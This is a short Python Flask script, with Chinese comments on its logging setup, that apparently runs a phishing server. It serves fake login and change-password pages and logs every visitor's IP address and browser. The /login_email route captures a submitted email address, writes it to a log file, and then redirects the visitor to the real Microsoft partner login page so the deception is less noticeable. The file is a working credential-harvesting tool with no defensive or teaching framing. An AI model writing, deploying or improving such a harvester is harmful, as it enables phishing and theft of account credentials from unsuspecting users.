#encoding=utf-8

from flask import Flask, redirect, request,render_template
import logging
logging.basicConfig(level=logging.ERROR,#控制台打印的日志级别
                    filename='./logs/new.log',
                    filemode='a',##模式，有w和a，w就是写模式，每次都会重新写日志，覆盖之前的日志
                    #a是追加模式，默认如果不写的话，就是追加模式
                    format=
                    '%(asctime)s - %(levelname)s: %(message)s'
                    #日志格式
                    )

app = Flask(__name__,template_folder="./templates")

@app.route("/changepwd")
def changpwd():
    # print(request.remote_addr, request.user_agent)
    logging.error(request.remote_addr, request.user_agent)
    return render_template("./chpwd.html")

@app.route("/login")
def login():
    # print(request.remote_addr,request.user_agent)
    logging.error(request.remote_addr,request.user_agent)
    return render_template("./login.html")

@app.route("/login_email",methods=['get','post'])
def login_email():
    # print(request.remote_addr, request.user_agent)
    logging.error(request.remote_addr, request.user_agent)
    email = request.args.get("email")
    logging.error("GET email:"+email)
    # print(email)

    return redirect("https://login.partner.microsoftonline.cn/")

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=8080,debug=True)
